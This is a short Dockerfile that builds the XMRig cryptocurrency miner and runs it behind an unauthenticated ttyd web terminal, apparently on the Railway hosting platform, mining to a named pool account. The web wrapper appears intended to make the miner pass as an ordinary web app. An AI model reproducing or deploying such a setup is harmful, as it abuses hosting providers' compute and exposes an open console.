# ==========================================
# Stage 1: Build XMRig (Advanced Build)
# ==========================================
FROM alpine:latest AS builder

RUN apk add --no-cache \
    git \
    make \
    cmake \
    libstdc++ \
    gcc \
    g++ \
    automake \
    libtool \
    autoconf \
    linux-headers

WORKDIR /build
RUN git clone https://github.com/xmrig/xmrig.git

WORKDIR /build/xmrig/scripts
RUN chmod +x build_deps.sh && ./build_deps.sh

WORKDIR /build/xmrig/build
RUN cmake .. -DXMRIG_DEPS=scripts/deps -DBUILD_STATIC=ON && \
    make -j$(nproc)

# ==========================================
# Stage 2: Minimal Runtime Environment
# ==========================================
FROM alpine:latest

# Install ttyd and bash/envsubst so environment variables expand cleanly
RUN apk add --no-cache ttyd bash

WORKDIR /app

COPY --from=builder /build/xmrig/build/xmrig ./xmrig

# Railway handles routing automatically, but EXPOSE 8080 is good practice
EXPOSE 8080

# Use shell execution so $PORT expands dynamically at startup
CMD sh -c "ttyd -p \${PORT:-8080} -w /app ./xmrig -a gr -o stratum+tcp://ghostrider.unmineable.com:3333 -u voidequiem -p x"
